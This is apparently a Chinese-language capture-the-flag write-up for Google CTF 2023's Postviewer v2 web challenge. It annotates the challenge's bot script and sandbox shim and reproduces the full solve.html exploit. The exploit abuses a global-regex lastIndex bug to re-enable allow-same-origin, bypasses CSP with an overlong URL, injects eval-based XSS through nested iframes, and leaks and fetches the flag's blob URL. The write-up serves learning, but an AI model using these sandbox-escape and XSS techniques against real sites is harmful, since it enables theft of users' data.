# Postviewer v2

[题目](https://github.com/google/google-ctf/tree/master/2023/web-postviewer2)

怎么这么难，我看答案看了好久都没明白（主要js那种高级语法看不太懂，查呀查，查了好久都不会）。不如写个有关js语法的笔记。

首先是从attachments中的bot.js找到flag在哪里。这里以visitUrl函数为主。
```js
async function visitUrl(context, data, sendToPlayer) {
  const { url, timeout: bot_timeout } = data;
  return new Promise(async resolve => {

    const page = await context.newPage(); //开启一个新页面

    await page.goto(PAGE_URL); //前往PAGE_URL，这里就是题目网站所在的url

    const pageStr = await page.evaluate(() => document.documentElement.innerHTML); //page.evaluate()： execute JavaScript code within the context of the page and retrieve values from it。所以pageStr为前往的页面的html内容

    if(!pageStr.includes('Postviewer v2')){
      const msg = 'Error: Failed to load challenge page.';
      console.error(`${msg}\nPage:${pageStr}`);
      resolve(msg); //js的promise就是异步，一个promise有3种状态：Pending，Fulfilled和Rejected。pending是初始状态，既不fulfilled也不rejected，应该是“执行中”的意思。这里调用的resolve函数将promise的状态从pending转为fulfilled，并返回一个值
      return;
    }

    sendToPlayer("Adding admin's flag.");
    await page.evaluate((flag) => {
      const db = new DB(); //这个DB对应题目源代码里的https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/challenge/src/static/db.js 
      db.clear();
      const blob = new Blob([flag], { type: 'text/plain' }); //The Blob object in JavaScript represents a blob (Binary Large Object), which is a raw data type that can hold binary data. It is commonly used to handle binary data such as files, images, or other types of data that are not text-based.
      db.addFile(new File([blob], `flag.txt`, { type: blob.type })); //The File object in JavaScript represents a file from the user's device or a file-like object. It is typically used to handle files uploaded by users or generated programmatically.
    }, FLAG); //整段代码的目的就是让bot将FLAG的内容作为文件上传到postviewer里的DB，文件名为flag.txt
    
    await page.reload(); //刷新页面
    await sleep(1000);

    const bodyHTML = await page.evaluate(() => document.documentElement.innerHTML);
  
    if(!bodyHTML.includes('file-') && bodyHTML.includes('.txt')) {
      const msg = 'Error: Something went wrong while adding the flag.';
      resolve(msg);
      console.error(`${msg}\nPage:${bodyHTML}`);
      return;
    }

    sendToPlayer('Successfully added the flag.');
    sendToPlayer(`Visiting ${url}`);
    await page.close(); //将刚才打开的页面关闭
    
    const playerPage = await context.newPage();
    setTimeout(async () => {
      const origin = await playerPage.evaluate(() => document.location.href); //document.location.href：当前页面的完整url
      resolve(`Timeout: ${origin}`);
    }, bot_timeout);
    try{
      await playerPage.goto(url); //访问我们提供的url
    }catch(e){};
  });
}
```
这题唯一的漏洞在[shim.html](https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/challenge/src/sandbox/shim.html)。
```js
window.onmessage = (e) => { //当某个message被接收到时执行下面代码（一个事件）,由window.postMessage触发。e.data为message的内容。具体见 https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/challenge/src/static/util.js previewFile和 https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/challenge/src/static/safe-frame.js previewIframe函数
                        const forbidden_sbx = /allow-same-origin/ig; //声明一个正则表达式，大小写不敏感且全局
                        ...
                        if(e.data.sandbox){
                            for(const value of e.data.sandbox){
                                if(forbidden_sbx.test(value) || !iframe.sandbox.supports(value)){
                                    console.error(`Unsupported value: ${value}`);
                                    continue;
                                }
                                iframe.sandbox.add(value);
                            }
                        }
}
```
js里一个有全局flag的正则表达式不能一直用。啥叫一直用？就是你用它匹配完一个字符串又原封不动地去匹配另一个，参考 https://stackoverflow.com/questions/1520800/why-does-a-regexp-with-global-flag-give-wrong-results ：A RegExp object with the g flag keeps track of the lastIndex where a match occurred, so on subsequent matches it will start from the last used index, instead of 0。所以我们只要postMessage时发送类似`sandbox: ['allow-same-origin', 'allow-same-origin', 'allow-scripts']`就能开启allow-same-origin。这是个好东西，因为： When sandbox:allow-same-origin is used, it relaxes the same-origin policy within the iframe. This means that the content within the iframe can interact with other documents from the same origin as the parent document. It allows the iframe to access and manipulate the DOM of the parent document and communicate with it using methods like postMessage(). allow-scripts为开启iframe内的js代码，没有这个iframe内部就无法使用js。有了这俩玩意的iframe就能与parent document交互并执行js代码。

根据开启这个iframe的代码：
```js
async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) {
    const url = new URL(shimUrl); //URL object在js里用于方便地修改url，本身没什么特殊点
    url.host = `sbx-${generateRandomPart()}.${url.host}`;
    url.searchParams.set('o', window.origin);

    var iframe = document.createElement('iframe'); //创建一个iframe
    iframe.src = url; //the URL of the content to be displayed within the iframe
    container.appendChild(iframe);
    iframe.addEventListener('load', () => { //当iframe加载完成时调用
        iframe.contentWindow?.postMessage({ body, mimeType, sandbox}, url.origin); //向iframe内的contentWindow发送message（就是上文提到的shim.html）
    }, { once: true }); //仅触发一次
}
```
这个iframe的parent document为sbx-*.postviewer2-web.2023.ctfcompetition.com，所以我们可以在这个页面里得到xss。所以这个`*`代表的究竟是啥？不知道，完全随机，我们也无法知道bot的url，所以还没法拿到flag。

现在就是要泄露`*`的内容。我们知道flag.txt的url肯定是`https://postviewer2-web.2023.ctfcompetition.com/#file-87ebbc317d687eeff47403603cc6dfb9b7d6c817`（`https://postviewer2-web.2023.ctfcompetition.com/#file-`加上flag.txt的sha1，页面的文件处理逻辑里有）。然后在preview这个文件时会有个包含flag.txt的iframe的shim.html弹出来，我们要泄露它的origin（`*`的内容）。有了这个origin就有了完整的shim.html url：`<leaked_origin>/shim.html`，去那里嵌入xss payload，然后在那里访问里面的那个iframe（这里没有限制。shim.html虽然也是个iframe但是没有sandbox，只有它里面那个套娃的iframe有），获取包含flag的`blob:`url，fetch得到flag。

但是呢有点问题。用bp抓个包，访问首页就能看见csp了：`Content-Security-Policy: frame-ancestors *.postviewer2-web.2023.ctfcompetition.com`。frame-ancestors指定可嵌入当前页面的父页面，这种情况表示只能是来自`*.postviewer2-web.2023.ctfcompetition.com`域的页面才能嵌入当前页面。所以没法在自己的网站嵌入这个iframe了。解决办法是嵌入到`sbx-anything.postviewer2-web.2023.ctfcompetition.com`。

别忘了我们的目标是去shim.html嵌入xss payload。去看看`sbx-*.postviewer2-web.2023.ctfcompetition.com/shim.html`的csp:`Content-Security-Policy: frame-src blob:`，寄。frame-src要求嵌入的iframe的来源为`blob:`，所以没法嵌入什么有用的东西。也没法通过访问不存在的页面获得更松的csp，甚至更严了：`sbx-anything.postviewer2-web.2023.ctfcompetition.com/not-found`会返回`Content-Security-Policy: default-src 'none'`

绕过方法参考这篇[文章](https://terjanq.medium.com/arbitrary-parentheses-less-xss-e4a1cf37c13d)。目标是在`sbx-*.postviewer2-web.2023.ctfcompetition.com`找到个没有csp的子页面执行xss payload，一个小技巧是尝试打开一个非常长的url，比如`sbx-anything.postviewer2-web.2023.ctfcompetition.com/AAAAA....AAA`，so this url will be blocked on the intermediate proxy side because of the overlong headers。

最后就是solve.html的笔记了。
```html
<script>
    (async () => {
        function formsg(msg) { //这个函数返回一个Promise，并设置onmessage事件。当接收到的message等于参数提供的msg时，resolve promise。调用这个函数formsg('a')等于暂停程序执行直到接收到a
            return new Promise(resolve => {
                onmessage = e => {
                    if (e.data == msg) resolve();
                }
            });
        }

        const sleep = d => new Promise(r => setTimeout(r, d));

        var ifr1 = document.createElement('iframe');
        ifr1.src = 'https://sbx-random.postviewer2-web.2023.ctfcompetition.com/shim.html?o=' + encodeURIComponent(window.origin); //encodeURIComponent()：encodes a Uniform Resource Identifier (URI) component by replacing certain characters with their percent-encoded representation
        document.body.appendChild(ifr1); //创建一个ifr1 iframe，iframe的来源为https://sbx-random.postviewer2-web.2023.ctfcompetition.com/shim.html?o=' + encodeURIComponent(window.origin); ，并将ifr1添加到当前document

        /**     
         * Step 1: 
         * the very first bug is that we can load shim.html with allow-same-origin flag
         * that is because, the regex has a global flag which increases lastIndex after first find.
         * It set ups an evaluator on sbx-random suborigin
         */

        ifr1.onload = () => {
            //向contentWindow，也就是shim.html postMessage
            //根据shim.html的内容，这里body的代码会成为shim.html创建的iframe中的内容。里面top.postMessage中的top指的是the highest-level window or frame in a nested browsing context hierarchy，即solve.html
            ifr1.contentWindow.postMessage({ body: `<script>onmessage=e=>eval(e.data);<\/script><iframe onload=top.postMessage('loaded','*')>`, mimeType: 'text/html', sandbox: ['allow-same-origin', 'allow-same-origin', 'allow-scripts', 'allow-top-navigation'] }, '*');
        }
        //top.postMessage post到这里，所以我们使用formsg等待其post完成后再继续执行
        await formsg('loaded');
        const deepIfr = ifr1.contentWindow[0][0] //这个是我们在postMessage那里的body里写的那个iframe

        /**
         * Step 2:
         * We prepare a deepIframe that will later used redirect top window to blob://sbx-random
         */

        deepIfr.location = URL.createObjectURL(new Blob([`<iframe name="deepIframe" onload=top.postMessage('loaded','*')>`], { type: 'text/html' }));
        const shimIfr = ifr1.contentWindow[0]; //shim.html创建的iframe。目前ifr1.contentWindow=shim.html，ifr1.contentWindow[0]=shim.html的用于展示内容的iframe，ifr1.contentWindow[0][0]=我们自己在内容里写的iframe
        await formsg('loaded');
        
        /**
         * Step 3:
         * The main app can be only iframed by *.postviewer2-web origins. However, shim domains have frame-src blob:
         * so it's not possible to directly iframe the main app. Instead, we use find a subpage on sbx-random origin
         * that doesn't set frame-src. One possibility is to just load a long URL that will be blocked on balancer side
         */

        const longUrl = `https://sbx-random.postviewer2-web.2023.ctfcompetition.com/${'a'.repeat(200000)}`

        /**
         * Step 4:
         * Normally, iframes are not able to redirect a top window to prevent frame busting (https://chromestatus.com/feature/5851021045661696).
         * However, openee can redirect its opener so we call open(url, "deepIframe") to establish that connection.
         * As a parent, you can open context to all children and grand children.
         */ 

        open(longUrl, 'deepIframe'); //在longUrl处加载deepIframe标签页。deepIframe就是上面deepIfr.location = URL.createObjectURL里的deepIframe
        
        
        await formsg('loaded');
        await sleep(1000);
        
        /**
         * Step 5: 
         * Use the evaluator to create a Blob from csp-less sbx-random origin
         * and redirect top window to it.
         */
        //shimIfr的内容为<script>onmessage=e=>eval(e.data);</script>，所以这里post的message会被eval。个人觉得接下来几个套娃iframe分别为：
        //top[0]=shim.html,top[0][0]=shim.html中的iframe，top[0][0][0]=deepIfr，top[0][0][0][0]=new Blob([`<iframe name="deepIframe" onload=top.postMessage('loaded','*')>`中的iframe
        //这里的eval是contentWindow自带的。将当前solve.html跳转到POC所在的url
        shimIfr.postMessage(`top[0][0][0][0].eval(\`top.location = URL.createObjectURL(new Blob(['<script>eval(atob("${btoa("(" + POC + ")()")}"))<\/script>'], {type: 'text/html'}))\`)`, '*');

        /** Steps 6, 10 execute the following:
         *  6. Iframe main page and select flag
         *  7. Leak flag's frame random's origin (e.g. sbx-dasjkdbkjsda) via ancestorOrigins property
         *  8. Once leaked, spawn an iframe pointing to sbx-dasjkdbkjsda
         *  9. From the forged iframe, read the blob URL of the flag contents
         *  10. Fetch the blob with flag and display it.
         */ 

        function POC() {
            const sleep = d => new Promise(r => setTimeout(r, d));
            /* Step 6 */
            onload = async () => {
                var x = document.createElement('iframe');
                x.src = 'https://postviewer2-web.2023.ctfcompetition.com/#file-87ebbc317d687eeff47403603cc6dfb9b7d6c817' //此时因为长url的关系，POC这里没有csp了，所以可以把flag选中
                document.body.appendChild(x);
                await sleep(1000);
                /* Step 7 */
                top[0][0][0].location = URL.createObjectURL(new Blob(['<script>top.postMessage(location.ancestorOrigins[0],"*")<\/script>'], { type: 'text/html' }));
            }

            onmessage = e => {
                /* Step 8 */
                if (e.data.includes?.('sbx-')) {
                    var x = document.createElement('iframe');
                    x.src = e.data + '/shim.html?o=' + encodeURIComponent(window.origin);
                    document.body.appendChild(x);

                    /* Steps 9 & 10 */
                    x.onload = () => {
                        x.contentWindow.postMessage({ body: `<script>fetch(top[0][0].document.querySelector('iframe').src).then(e=>e.text()).then(e=>top.postMessage({flag: e},'*'))<\/script>`, mimeType: 'text/html', sandbox: ['allow-same-origin', 'allow-same-origin', 'allow-scripts', 'allow-modals'] }, '*');
                    }
                }

                if (e.data.flag) {
                    history.pushState('','',`blob:${location.origin}/${e.data.flag}`); //访问flag
                }
            }
        }
    })()
</script>
```
真的绕啊，其实我感觉我还没完全懂。但就这样了，看了一个下午了都。